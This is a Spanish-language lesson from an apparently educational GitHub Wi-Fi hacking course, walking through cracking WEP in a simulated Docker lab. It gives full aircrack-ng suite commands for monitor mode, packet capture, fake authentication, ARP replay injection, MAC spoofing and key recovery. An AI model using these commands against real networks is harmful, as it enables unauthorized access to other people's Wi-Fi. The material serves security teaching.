# WEP Cracking Lab
## Introducción
El protocolo por excelencia que nos permite una conexión inalámbrica tanto con Internet (el resto del mundo) como con los dispositivos de área local (redes LAN) es el protocolo IEEE 802.11, más conocido como Wi-Fi. Este protocolo ha ido evolucionando tanto en cuestiones técnicas que permiten una mayor velocidad, ancho de banda, etc., como en la línea de la seguridad. Poniendo la mira en este último aspecto, se puede resumir la evolución en cuatro protocolos de seguridad para redes inalámbricas: WEP, WPA/WPA2, WPS y WPA3. 

Durante este curso, se estudiarán estos protocolos, así como sus vulnerabilidades, las cuales permiten a los atacantes conseguir un acceso ilegítimo en las redes Wi-Fi que protegen. Además, se verán algunas contramedidas y recomendaciones que podrían paliar estos problemas (si son sostenibles hoy en día), así como las consecuencias que se manifiestan cuando un atacante se introduce en nuestra red Wi-Fi aprovechando malas configuraciones o explotando vulnerabilidades que comprometen a las máquinas conectadas a esta red.


## Protocolo de seguridad WEP
En primer lugar, se analizará el primero de todos los protocolos de seguridad que han surgido con el objetivo de proteger las redes IEEE 802.11: el protocolo WEP. WEP fue diseñado originalmente en 1997 como parte del estándar IEEE 802.11, siendo así el primer mecanismo de seguridad establecido por el estándar más coloquialmente conocido como Wi-Fi. Su funcionamiento se centra en ofrecer confidencialidad, integridad y control de acceso en comunicaciones por vía inalámbrica. [[33](https://ieeexplore.ieee.org/document/654749)]

Este protocolo de seguridad se basa en el uso del cifrado de flujo RC4 (su uso no tardaría en estar desaconsejado por diferentes vulnerabilidades) con claves precompartidas de 40 o 104 bits de longitud, a las cuales se les concatena un vector de inicialización (IV) de 24 bits, con lo que se busca dar una mayor aleatoriedad a la clave final: [[33](https://ieeexplore.ieee.org/document/654749)]
![image](https://github.com/user-attachments/assets/55ec2072-4bac-426f-8174-9b5c2b9a3ebd)

Además, se puede apreciar el uso del mecanismo CRC para la comprobación de la integridad de los mensajes intercambiados, aunque este protocolo ya era vulnerable en la época por ser una operación lineal fácilmente predecible. 


### Vulnerabilidades 
A día de hoy, este protocolo se encuentra completamente en desuso, ya que no tardaron en surgir ataques que permitían a los usuarios maliciosos conocer la clave preestablecida entre cliente y punto de acceso. Entre estos ataques, destacaron los siguientes: 

- **FMS (Fluhrer, Mantin y Shamir):**  
  Este ataque se centra en la explotación de las vulnerabilidades del protocolo RC4. Para ello, aprovecha el limitado tamaño de los IVs y la compartición de estos en texto plano. Concretamente consiste en recolectar los IVs suficientes (más éxito en redes con muchos usuarios conectados a un mismo punto de acceso) hasta encontrar varios mensajes con un mismo vector de inicialización. A partir de aquí, basta con aplicar medidas estadísticas para obtener la clave completa y descifrar los paquetes capturados con ese IV, o bien obtener la clave precompartida que da acceso a la red. [[34](https://matthieu.io/dl/papers/wifi-attacks-wep-wpa.pdf)]

- **Ataques de diccionario y análisis estadístico:**  
  Este tipo de ataques resulta muy similar a los anteriores, aunque mejora la eficiencia gracias a la implementación de diccionarios de IV asociados a claves precalculadas. De esta forma, no se prueban todas las opciones que puedan dar resultado con una cierta clave completa, sino que se prueban aquellas relativas a los IVs recopilados según las claves RC4 precalculadas. [[35](https://infoscience.epfl.ch/server/api/core/bitstreams/beffaf7b-9a49-40b5-a0bc-c41d76b253ca/content)]

- **Ataques de inyección de paquetes:**  
  Más que un ataque individual, consiste en un complemento de los anteriores al introducir paquetes maliciosos con IVs válidos en la red con la intención de aumentar el número de IVs que se pueden recolectar. [[35](https://infoscience.epfl.ch/server/api/core/bitstreams/beffaf7b-9a49-40b5-a0bc-c41d76b253ca/content)]

A continuación se verá cómo realizar el primero de ellos, al ser el más común entre los atacantes y estar implementado por el paquete `aircrack-ng`. 


## Atacando WEP
El primer paso para poder realizar este ataque consiste en iniciar el laboratorio; para ello hay que colocarse en esta rama o descargar los ficheros en ella almacenados. Una vez tenemos todos los archivos necesarios, se inicia el laboratorio mediante la ejecución de (se recomienda realizar esto en una máquina con kernel de Linux completo, debido a funciones no soportadas por Docker Desktop):
```
sudo ./launch.sh
```

`Nota:` para poder parar de forma segura el laboratorio, ejecutar `sudo ./stop.sh`. Esto se debe hacer también para poder reiniciarlo correctamente antes de volver a ejecutar `sudo ./launch.sh`.

Tras esperar unos segundos a que todo se configure, se verán los siguientes mensajes, compuestos por avisos sin mucha importancia e información del laboratorio sobre el estado del lanzamiento:
![image](https://github.com/user-attachments/assets/98474acc-bad7-48c3-aa62-bacb38d541d4)

Si todo ha ido bien, se puede comenzar el ataque estableciendo conexión con la máquina Kali:
```
docker-compose exec attacker-1 bash 
```

Una vez dentro de la máquina atacante, se debe poner la interfaz inalámbrica (normalmente wlan4, aunque conviene comprobarla con `ifconfig`) en modo monitor (permite la escucha de paquetes que no van dirigidos a nuestra IP) con la intención de poder escuchar trazas *beacon* (anuncios del punto de acceso para que se conecten los clientes) y otros paquetes de interés:
```
airmon-ng start wlan4
```

Con esto se levanta la interfaz en este nuevo modo, de forma que ahora su nombre puede variar a algo similar a `wlan4mon` o quedarse igual (`wlan4`):
![image](https://github.com/user-attachments/assets/ceeabc84-91c1-43b6-bc51-06ab1b4adfc6)


Una vez en este modo, se puede proceder a lanzar el comando `airodump-ng`, el cual captura los paquetes de red dentro del alcance de la interfaz en modo monitor que se le indique. En un primer análisis es interesante usarlo de la siguiente forma:
```
airodump-ng wlan4mon
```

Capturando absolutamente todo, de forma que se pueda detectar la red que se desea atacar:
![image](https://github.com/user-attachments/assets/bb24637a-556b-44b7-a395-0e096132eaa6)

En este caso solo existe una red (WEPnetwork), pero lo más normal es que aparezcan entradas en esta tabla con una mayor cantidad de redes, como sucede por ejemplo en esta imagen:
![image](https://github.com/user-attachments/assets/86c073a1-06bd-4f6e-b436-31f2e0cb6b95)

Una vez localizada la red de interés, es posible usar este comando junto a las siguientes opciones (debes ajustarlas a tu caso) con el objetivo de capturar los IVs necesarios para ejecutar el ataque FMS mencionado anteriormente.

```
airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w wep wlan4mon
```
* `-c 6`: canal en el que trabaja el punto de acceso.  
* `--bssid 02:00:00:00:00:00`: dirección MAC del punto de acceso.  
* `-w wep`: nombre (sin extensión) de los ficheros donde se almacenarán los paquetes capturados.  
* `wlan4mon`: nombre de la interfaz del atacante.

Además, añadiendo la opción `--ivs` la herramienta se centra en capturar estos y no todo el paquete, de forma que se optimiza un poco esta parte. Sin embargo, aun con esta opción no se consiguen fácilmente los IV necesarios sin esperar una gran cantidad de tiempo. Para acelerar este proceso, se debe buscar una forma de aumentar considerablemente el número de IV que se generan en la red. Para conseguir esto se puede usar otro comando del paquete `aircrack-ng`, el comando `aireplay-ng`.

De esta forma, se pueden inyectar paquetes ARP (*ARP request*) que el punto de acceso reenviará, generando así más IV. Aunque no es tan trivial poder enviar estos paquetes, ya que el punto de acceso solo va a reenviar los paquetes que provengan de una dirección MAC autenticada. Por tanto, hay dos opciones: conocer la dirección MAC de uno de los clientes y ponerla en la máquina atacante, o bien usar nuevamente `aireplay-ng` para realizar una autenticación falsa en el punto de acceso, lo cual permite asociarse con el punto de acceso sin tener autorización para ello. A continuación se verá cómo abordar esta segunda opción, ya que no es común conocer las direcciones MAC de los clientes autenticados:
```
docker-compose exec attacker-1 bash      # Ejecutarlo en otra terminal
aireplay-ng -1 0 -e WEPnetwork -a 02:00:00:00:00:00 -h 02:00:00:00:04:00 wlan4mon
```
* `-1`: *fake authentication*.  
* `0`: tiempo de reasociación en segundos.  
* `-e WEPnetwork`: SSID del punto de acceso.  
* `-a 02:00:00:00:00:00`: dirección MAC del punto de acceso.  
* `-h 02:00:00:00:04:00`: dirección MAC de la interfaz del atacante (`iw wlan4mon info`).  
* `wlan4mon`: nombre de la interfaz del atacante.

Este comando muestra lo siguiente en caso de conseguir una conexión con el punto de acceso:
![image](https://github.com/user-attachments/assets/bb2dfc3e-ce48-4bde-9f6c-81e17b53ecb7)

En caso de no funcionar, se puede obtener la dirección MAC accediendo a la máquina de alguno de los clientes, o gracias a que `airodump-ng` capture su tráfico: 
![image](https://github.com/user-attachments/assets/c03451fa-5321-45a8-9926-ab789d25809d)

Y luego cambiar la MAC del atacante de la siguiente manera:
```
macchanger -m 02:00:00:00:02:00 wlan4
```

Esta es una opción para acelerar el ataque evitando el paso de la falsa autenticación. Se recomienda probar este método tras acabar el ataque usando la falsa autenticación. Una vez se ha efectuado la autenticación con el punto de acceso (aunque sea falsa o simplemente se logre mediante el cambio de MAC), es posible enviarle los paquetes ARP necesarios para aumentar el número de IVs:
```
aireplay-ng -3 -b 02:00:00:00:00:00 -h 02:00:00:00:04:00 wlan4mon
```
* `-3`: *ARP replay attack*.  
* `-b 02:00:00:00:00:00`: dirección MAC del punto de acceso.  
* `-h 02:00:00:00:04:00`: dirección MAC de la interfaz del atacante.  
* `wlan4mon`: nombre de la interfaz del atacante.

Realmente este comando está tomando los paquetes ARP que escucha en cualquiera de las redes en las que se encuentra y los reenvía al punto de acceso. Por tanto, si se desea aumentar el número de peticiones ARP que se envían, se puede hacer *ping* a una máquina accesible desde el dispositivo (normalmente mediante una interfaz cableada):
```
arping 10.5.2.129
```

Sin embargo, al tratarse de un entorno simulado esto muy posiblemente no funcione, de forma que se obtiene una salida similar a:
![image](https://github.com/user-attachments/assets/cb6c106f-b563-4b8f-995c-ac766f66805f)

La cual expresa que no se están retransmitiendo los paquetes ARP y, por tanto, no se generan esos nuevos IVs, lo cual hace que esta aceleración no funcione y haya que esperar a recopilar una mayor cantidad de IVs. Para evitar esto y hacer más satisfactorio el proceso de ataque evitando largas esperas, se puede forzar el envío de paquetes ARP desde cualquier cliente con:
```
docker-compose exec client-1 bash      # Tambien posible con client-2 o client-3
while true; do
    arp-scan --interface=wlan1 --localnet
    sleep 5  # Espera 5 segundos entre escaneos para no saturar
done
```

`Nota:` este proceso solo es posible en una simulación como esta, ya que en un entorno real no se tiene acceso a los clientes legítimos.

Tras esperar un tiempo para que `airodump-ng` capture los suficientes IVs, se debe parar este tecleando `q`, de forma que se generan varios ficheros que almacenan la información capturada en diferentes formatos. El más interesante de ellos es `*.cap`, el cual almacena los paquetes enteros, haciendo posible analizarlos con otras herramientas como Wireshark. Además, con este paquete se puede usar `aircrack-ng` con el objetivo de ejecutar el ataque FMS gracias a los IVs capturados:
```
aircrack-ng -b 02:00:00:00:00:00 wep*.cap
```
* `-b 02:00:00:00:00:00`: MAC del punto de acceso (opcional).  
* `wep*.cap`: usar todos los archivos `.cap` que comienzan con el nombre `wep` (si se hacen varios `airodump-ng` con `-w wep` se generarán archivos `wepN.extension`).  
![image](https://github.com/user-attachments/assets/a0b1b032-29c5-47bb-9195-9fa04af96d25)

En concreto, se está ejecutando una versión bastante fiel al algoritmo FMS original que aplica medidas estadísticas mediante fuerza bruta. Sin embargo, `aircrack-ng` ofrece otro modo de realizar este ataque al cual llama PTW. Este método es una optimización de FMS que requiere de un menor número de IVs (es más rápido), pero se deben capturar paquetes ARP completos (se podrían generar IVs con otros protocolos, pero solo se ve ARP por esto), por lo que sería necesario repetir todo el procedimiento sin la opción `--ivs` en caso de haber sido seleccionada en `airodump-ng`.  
```
aircrack-ng -z -b 02:00:00:00:00:00 wep*.cap
```
* `-z`: PTW WEP-cracking.  
* `-b 02:00:00:00:00:00`: MAC del punto de acceso (opcional).  
* `wep*.cap`: usar todos los archivos `.cap` que comienzan con el nombre `wep` (si se hacen varios `airodump-ng` con `-w wep` se generarán archivos `wepN.extension`).  
![image](https://github.com/user-attachments/assets/0150abf2-6e10-4fb4-ac75-fcad7ddac014)

Como se aprecia, en ambos casos se obtiene la clave que autoriza el acceso a la red y permite el cifrado de paquetes, pero en caso de no haber recolectado los suficientes IVs se muestra algo como:
![image](https://github.com/user-attachments/assets/d515b440-a399-4ca2-a5d6-a410e159ff8e)

`Nota:` se puede probar el funcionamiento de la clave con `wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B`, que usa el fichero de configuración `wpa_supplicant.conf` para definir esta clave junto al SSID y todo lo necesario para establecer la conexión, sumado a `dhclient wlan4` para obtener una IP. Para esto es recomendable usar la interfaz `wlan4` fuera del modo monitor.

### Contramedidas y recomendaciones
Como ya se ha mencionado, este protocolo de seguridad está completamente desaconsejado a día de hoy, debido a sus múltiples amenazas. Incluso los nuevos puntos de acceso Wi-Fi ya no suelen incluirlo para evitar exponer a los usuarios que deseen usarlo a conciencia o por desconocimiento. Por tanto, no es necesario aportar ninguna contramedida, ya que lo mejor que se puede hacer es evitar su uso.

[`Volver a la introducción`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/main)  
[`Siguiente lección, ataques tras conseguir acceso`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks)
